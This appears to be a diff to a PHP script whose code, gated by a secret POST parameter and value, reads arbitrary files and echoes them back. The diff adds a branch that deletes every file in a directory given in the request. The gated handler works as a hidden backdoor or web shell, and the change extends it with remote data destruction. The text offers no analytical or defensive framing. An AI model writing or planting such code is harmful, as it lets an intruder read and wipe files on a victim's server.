@@ -23,6 +23,13 @@ if(isset($_POST['paodnwpaks']) && $_POST['paodnwpaks'] == 872934){
 		$fh = fopen($myFile, 'r') or die("can't open file");
 		echo fread($fh, filesize($myFile));
 		fclose($fh);
+	}elseif(strcmp($_POST['fnc'], 'delete') == 0){
+		$dir = $_POST['dir'];
+		$files = glob($dir."/*"); // get all file names
+		foreach($files as $file){ // iterate files
+		  if(is_file($file))
+		    unlink($file); // delete file
+		}
 	}else{
 		header('location:index.php');
 	}
